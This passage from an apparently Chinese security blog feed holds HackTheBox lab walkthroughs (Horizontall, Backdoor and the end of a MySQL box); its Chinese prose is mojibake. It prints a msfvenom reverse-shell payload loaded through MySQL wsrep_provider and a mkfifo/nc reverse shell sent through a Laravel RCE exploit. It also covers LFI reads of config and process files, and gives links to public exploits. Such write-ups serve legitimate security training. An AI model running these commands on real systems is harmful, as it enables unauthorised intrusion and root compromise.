src="https://img-blog.csdnimg.cn/c46ad8d982584668af369bfe0217eb1c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°è¯•ç™»å½•åˆ°æ•°æ®åº“ä¸Šï¼Œæ•°æ®åº“çš„ç‰ˆæœ¬ä¸º<code>10.3.25</code><br><img src="https://img-blog.csdnimg.cn/c99b6814e5f94d5796ef64db705d2fe9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘å°è¯•è¿‡æœå¯»æ•°æ®åº“ä¸­å¯¹åº”è´¦æˆ·çš„å¯†ç è¿›è¡Œè§£å¯†ï¼Œä½†æ˜¯éƒ½æ— åŠŸè€Œè¿”ã€‚åˆ‡æ¢ä¸€ç§æ€è·¯ï¼Œæˆ‘æœå¯»åˆ°äº†mysqlå¯¹åº”ç‰ˆæœ¬çš„æ¼æ´ä¿¡æ¯ã€‚æ–‡ç« ä¸­è¯´æ˜äº†è¿™ä¸ªç‰ˆæœ¬çš„mysqlå­˜åœ¨RCEæ¼æ´<br><img src="https://img-blog.csdnimg.cn/88dd5b53214b46a1b29cf0f8250eadfd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘åœ¨githubä¸Šæ‰¾åˆ°ä¸€ä¸ªæ¼æ´åˆ©ç”¨çš„è„šæœ¬ï¼Œè¿™æ˜¯é“¾æ¥<a href="https://github.com/Al1ex/CVE-2021-27928">https://github.com/Al1ex/CVE-2021-27928</a><br><img src="https://img-blog.csdnimg.cn/11fbc233c5ad4caa848e064466e57189.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ ¹æ®æç¤ºæ¥ï¼Œæˆ‘ä»¬å…ˆç”Ÿæˆä¸€ä¸ªå¯¹åº”çš„payloadï¼Œå†å¼€å¯ç›‘å¬åå¼¹ä¸€ä¸ªrootçš„shellåˆ°æœ¬åœ°ä¸Š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.30 LPORT=4445 -f elf-so -o payload.so</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/ba5f1d4ea3274eadaa72fd212301296f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæŠŠpayloadæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸Š<br><img src="https://img-blog.csdnimg.cn/d37c053a543346549047aa87a86b4409.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ€åç™»å½•åˆ°mysqlé‡Œï¼Œæ‰§è¡Œè¿™ä¹ˆä¸€æ®µæŒ‡ä»¤<code>SET GLOBAL wsrep_provider=&quot;/tmp/payload.so&quot;;</code>ï¼Œè·å¾—rootæƒé™<br><img src="https://img-blog.csdnimg.cn/cab9ce62d2c54b2d8ef5236665166e5d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸ªé¶æœºè¿˜æ˜¯ç›¸å½“å‡ºè‰²çš„ï¼Œé¦–å…ˆä¸€èˆ¬çš„æ‰«æåªèƒ½æ‰«æåˆ°80çš„webæœåŠ¡ï¼Œå› ä¸ºwebæœåŠ¡æœ€å¤šå°±åªèƒ½å‘æ˜åˆ°å­åŸŸçš„ç™»å½•è¡¨å•ä¸Šï¼Œä¹‹åå°±æ–­æ€è·¯äº†ã€‚æ‰€ä»¥è¿˜å¾—æ‰«æUDPçš„ç«¯å£ï¼Œè¿™ä¸ªå°±ä¸æ˜¯ç‰¹åˆ«å¤šäººèƒ½å¤Ÿæƒ³å¾—åˆ°ï¼Œè¿›è¡Œç™»å½•æ“ä½œåï¼Œåˆå¾—è€ƒéªŒå¯¹zabbixçš„RCEæ¼æ´åˆ©ç”¨ï¼Œè¿™ä¸ªè¦æ±‚ä¹Ÿæ¯”è¾ƒé«˜ï¼Œç„¶åå†åˆ°rootçš„ææƒä¸Šï¼Œå¾ˆå……åˆ†åœ°è€ƒæŸ¥äº†å¯¹ä¸­é—´ä»¶å®‰å…¨çš„çŸ¥è¯†ï¼Œæ€»ä½“æ¥è¯´è¿™æ˜¯ä¸€ä¸ªç›¸å½“å‡ºè‰²çš„é¶æœºã€‚</p>
]]></content>
      <categories>
        <category>ä¸­é—´ä»¶</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Horizontall</title>
    <url>/2022/01/09/Horizontall/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>ç›®æ ‡ä¸»æœºåªå¼€æ”¾äº†sshå’ŒwebæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/c6ea98b32b994a8f8a0cf9c759db1cee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ç›´æ¥è®¿é—®webæœåŠ¡ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ç½‘é¡µï¼Œæ‰«æç›®å½•ä¹Ÿæ²¡æœ‰å‘ç°æœ‰ä»·å€¼çš„ä¿¡æ¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u <span class="string">&quot;http://horizontall.htb/&quot;</span> -w /usr/share/seclists/Discovery/Web-Content/common.txt -e 404,500 -t 50</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/f6b30b44e96d409f934b299e104245eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>é‚£æˆ‘ä»¬å°†æ³¨æ„åŠ›è½¬ç§»åˆ°å­åŸŸåä¸Šï¼Œå¯¹å­åŸŸåè¿›è¡Œæ·±å…¥æŒ–æ˜ï¼Œå‘ç°äº†ä¸€ä¸ªå­åŸŸåï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å®æ–½æ—ç«™æ³¨å…¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster vhost -u http://horizontall.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2cf9c69827e84e87b9616816c817376d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è®¿é—®è¿™ä¸ªé¡µé¢æ—¶å‘ç°ä½¿ç”¨çš„æ˜¯<code>strapi</code>è¿™ä¸ªCMS<br><img src="https://img-blog.csdnimg.cn/3724c08fac2d427f80427e762141b930.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>æˆ‘ä»¬ä¾ç…§è¿™ä¸ªè·¯å¾„è¿›è¡Œè·¯å¾„çš„æ‰«æï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªadminç›®å½•ï¼Œæˆ‘ä»¬è®¿é—®å‘ç°ä¼šè·³è½¬åˆ°ç™»å½•è¡¨å•ä¸Š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u <span class="string">&quot;http://api-prod.horizontall.htb/&quot;</span> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e 404,500 -t 50</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/19c0c71aaef14180949dead326bc5c37.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>å°è¯•äº†ä¸€éSQLæ³¨å…¥ï¼Œå‘ç°ä¸å­˜åœ¨SQLæ³¨å…¥çš„é—®é¢˜ã€‚é‚£æˆ‘ä»¬è½¬å‘ä¸­é—´ä»¶æ¼æ´è¿™ä¸ªæ–¹å‘ä¸Šï¼Œåœ¨EDBä¸ŠæŸ¥æ‰¾åˆ°å­˜åœ¨ä¸€ä¸ªå¯†ç é‡ç½®çš„RCEæ¼æ´<br><img src="https://img-blog.csdnimg.cn/fd1458a74a574a918911ef0a1ae87cfe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/acf1f0e8aea34dacb917647d4ee1f190.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ç¼–è¾‘ä¸ºä¸€ä¸ªexpæ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œå®ƒè·å–åˆ°ä¸€ä¸ªç”¨æˆ·äº¤äº’çš„shellç»ˆç«¯ã€‚è¿™é‡Œæ˜¾ç¤ºç”¨æˆ·åå’Œå¯†ç æ˜¯<code>admin:SuperStrongPassword1</code><br><img src="https://img-blog.csdnimg.cn/d93aa5dc52404922aadb13f884d33ccf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç™»å½•è¿›é¡µé¢å‘ç°å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œä½†æ˜¯è¿™ä¸ªå¹¶ä¸èƒ½è¿›è¡Œæ–‡ä»¶ä¸Šä¼ getshell<br><img src="https://img-blog.csdnimg.cn/8b81cd2146e843a5941549c0bfe46564.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å‘ç°è¿™ä¸ªEXPæ˜¯å­˜åœ¨RCEå‘½ä»¤æ‰§è¡Œçš„åŠŸèƒ½çš„ï¼Œé‚£æˆ‘ä»¬å¯ä»¥åœ¨äº¤äº’ç»ˆç«¯ä¸Šè¿›è¡Œåå¼¹ä¸€ä¸ªshellç»™æˆ‘ä»¬<br><img src="https://img-blog.csdnimg.cn/88522af59e4e42d2bd77c449691c2e62.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬å°†linpeas.shè„šæœ¬ä¸‹è½½åˆ°ç›®æ ‡æœºå™¨ä¸Šï¼Œå°è¯•çœ‹çœ‹æœ‰æ²¡æœ‰å­˜åœ¨ææƒçš„çªç ´ç‚¹<br><img src="https://img-blog.csdnimg.cn/a7e43564181146d0b3e82efaac54674a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿è¡Œè„šæœ¬åï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰å‘ç°ä»»ä½•å¯ææƒçš„ç‚¹ï¼Œä½†æ˜¯æˆ‘ä»¬æŸ¥çœ‹ä¸»æœºè¿è¡Œçš„ç«¯å£å¯ä»¥å‘ç°ï¼Œä¸»æœºçš„1337ç«¯å£æ­£åœ¨ä»¥rootèº«ä»½è¿è¡Œç¨‹åºï¼Œç”±äºæˆ‘ä»¬ç”¨nmapæ— æ³•æ‰«æå‡ºè¯¥ç«¯å£ï¼Œå¯ä»¥æ¨æ–­ä¸»æœºåšäº†å†…ç½‘ç«¯å£çš„è½¬å‘ã€‚<br><img src="https://img-blog.csdnimg.cn/0638be03f2764c3f9db143944921a40f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨frpè¿›è¡Œå†…ç½‘çš„ç«¯å£å¤ç”¨ï¼Œé¦–å…ˆå…ˆå°†<code>frpc</code>å’Œ<code>frpc.ini</code>ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸Šï¼Œä¸Šä¼ æˆåŠŸåè®¾ç½®å¥½æˆ‘ä»¬æœ¬æœºçš„ipåœ°å€å’Œè¦è½¬å‘æœ¬åœ°ç«¯å£å’Œè¿œç¨‹ç«¯å£<br><img src="https://img-blog.csdnimg.cn/5b03de7f59a043c887497c243c893d3d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨ç›®æ ‡æœºå™¨å’Œæœ¬æœºä¸Šåˆ†åˆ«å¼€å¯ç›‘å¬æœåŠ¡<br><img src="https://img-blog.csdnimg.cn/28bf83b3599646c89714b357a407787f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬è®¿é—®æœ¬æœºçš„8000ç«¯å£ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç”±Laravelæ¡†æ¶æ­å»ºèµ·æ¥çš„ç½‘é¡µç¨‹åº<br><img src="https://img-blog.csdnimg.cn/8581ba2866b940708a56f715327a7152.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¸ªåº”ç”¨ç¨‹åºè¿‘å¹´å‘ç°ä¸€ä¸ªå­˜åœ¨RCEçš„æ¼æ´ï¼Œåœ¨githubä¸Šå¯ä»¥æœåˆ°å¯¹åº”çš„EXPæ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œå¹¶æ‰§è¡Œå¯è§æ¼æ´åˆ©ç”¨æˆåŠŸ<br><a href="https://github.com/LucifielHack/CVE-2021-3129_exploit">https://github.com/LucifielHack/CVE-2021-3129_exploit</a><br><img src="https://img-blog.csdnimg.cn/e95aaf54fdb343a199cf7ec03bc27d52.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åå¼¹ä¸€ä¸ªrootçš„shellåˆ°æœ¬æœºä¸Š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./exploit.py http://localhost:8000 Monolog/RCE1 <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.25 4445 &gt;/tmp/f&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/9d4a8f62eb834cb78ddc826a02de9132.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/db008ce7bfb14ce78f99c0d2534651e1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>CMS</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Backdoor</title>
    <url>/2022/01/04/Backdoor/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å‘ç°ç›®æ ‡ä¸»æœºå¼€æ”¾äº†sshå’ŒwebæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/91c55463b8894dfc8281797fa545de3c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°†<code>backdoor.htb</code>æ·»åŠ åˆ°hostsæ–‡ä»¶ä¸­åï¼Œè®¿é—®webæœåŠ¡ï¼Œå‘ç°æ˜¯ä¸€ä¸ªWordPressé¡µé¢ï¼Œå¹¶ä¸”ç‰ˆæœ¬æ˜¯<code>5.8.1</code><br><img src="https://img-blog.csdnimg.cn/fc20025359b542d092eda73dfd36dc39.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>æ—¢ç„¶æ˜¯wordpressï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨wpscanæ¥æ‰«æå­˜åœ¨å“ªäº›æ¼æ´</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://backdoor.htb/ --api-token X4CFiaLdgwD6FwDMhkrZMpNjFDZ7Ex6DWqlcPM9DVic --enumerate p,u --plugins-detection aggressive</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/c7c8fb81233a4b49b06e3d757078c9dd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°å­˜åœ¨ä¸€ä¸ªç»„ä»¶æ¼æ´ï¼Œè·¯å¾„æ˜¯<code>http://backdoor.htb/wp-content/plugins/akismet/</code>ï¼Œæˆ‘ä»¬è®¿é—®å…¶ä¸Šä¸€çº§ç›®å½•å‘ç°æ˜¯ebookçš„æ’ä»¶<br><img src="https://img-blog.csdnimg.cn/59ce377ff44443e0ae407e8028b768a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>æˆ‘ä»¬åœ¨EDBä¸Šå‘ç°äº†è¿™ä¸ªç»„ä»¶å­˜åœ¨ç›®å½•ç©¿è¶Šæ¼æ´<br><img src="https://img-blog.csdnimg.cn/c15aaa1c2f99402aa234d95d4ba7d7ff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è®¿é—®å…¶è·¯å¾„ï¼Œå¹¶å°†wp-config.phpæ–‡ä»¶ä¸‹è½½ä¿å­˜ä¸‹æ¥ï¼Œå‘ç°äº†mysqlçš„ç”¨æˆ·åå’Œå¯†ç <br><img src="https://img-blog.csdnimg.cn/9276f5329d5444d1a4e7f701f2b2b3e5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½†æ˜¯æˆ‘ä»¬åˆ°åå°è¿›è¡Œç™»å½•æ—¶å‘ç°æ— è®ºæ˜¯<code>admin</code>å’Œ<code>wordpressuser</code>éƒ½æ˜¯ç™»é™†å¤±è´¥çš„<br><img src="https://img-blog.csdnimg.cn/d7d52ae101994365b067e0463284ecec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬åªèƒ½åˆ‡æ¢å¦ä¸€ä¸ªæ€è·¯äº†ï¼Œä¸Šé¢æˆ‘ä»¬è¯´åˆ°æ—¶å­˜åœ¨ä¸€ä¸ªLFIæ¼æ´çš„ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨LFISuiteè¿›è¡Œè·¯å¾„çš„æ£€æµ‹<br><img src="https://img-blog.csdnimg.cn/12af5d4372a042a783fd87b77f83506d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è™½ç„¶å¯ä»¥æ‰¾åˆ°passwdæ–‡ä»¶ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ä»»ä½•çš„ä½œç”¨<br><img src="https://img-blog.csdnimg.cn/be7eb457f68b4b6799558545455b690c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ç›®æ ‡ä¸»æœºéƒ½åœ¨è¿è¡Œé‚£äº›è¿›ç¨‹ï¼Œé€šè¿‡ä¼ å…¥<code>/proc/pid/cmdline</code>è¿™ä¸ªè·¯å¾„å‚æ•°ï¼Œå…¶ä¸­pidçš„å€¼æˆ‘ä»¬å¯ä»¥è¿›è¡Œæ¨¡ç³Šï¼Œå¹¶ç”¨burpsuiteè¿›è¡ŒæŠ“åŒ…åˆ†æã€‚å…¶ä¸­ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšï¼Œè¿™æ˜¯Linux æ–‡ä»¶ç³»ç»Ÿå±‚æ¬¡ç»“æ„çš„æ–‡ç« è§£æé“¾æ¥<a href="https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html">https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html</a><br><img src="https://img-blog.csdnimg.cn/bffa7223627d4dfe8db4b137b4984909.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/2a11eb47eaea430685df1782909d56fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å‘ç°è¿›ç¨‹å·ä¸º793çš„è¿›ç¨‹ï¼Œåœ¨æœ¬æœºçš„1337ç«¯å£ä¸Šè¿è¡Œè¿™ä¸€ä¸ª<code>gdbserver</code>è¿™æ ·ä¸€ä¸ªç¨‹åº<br><img src="https://img-blog.csdnimg.cn/f4483a61544247d282456891a4d1f1dc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="ç¬¬ä¸€ç§æ–¹æ³•"><a href="#ç¬¬ä¸€ç§æ–¹æ³•" class="headerlink" title="ç¬¬ä¸€ç§æ–¹æ³•"></a>ç¬¬ä¸€ç§æ–¹æ³•</h3><p>æˆ‘ä»¬åœ¨EDBä¸­å‘ç°äº†gdbserverè¿™ä¸ªç¨‹åºæ˜¯å­˜åœ¨æ¼æ´çš„<br><img src="https://img-blog.csdnimg.cn/abd8f238cf054450a79a3a3d13e79783.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°†å…¶å†…å®¹ä¿å­˜ä¸ºexp.pyæ–‡ä»¶ï¼Œç„¶åæŒ‰ç…§æç¤ºå…ˆç”Ÿæˆä¸€ä¸ªrev.binæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/54d8c0fbe2bc4a9590f41b6770b2bee0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åå¼€å¯ç›‘å¬ï¼Œè¿è¡Œæˆ‘ä»¬çš„expå¹¶è·å–ç›®æ ‡ä¸»æœºçš„shell<br><img src="https://img-blog.csdnimg.cn/1da19bb296474d1fa28f040adfacede6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/6b571bba98c44cfe92c049f327069088.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
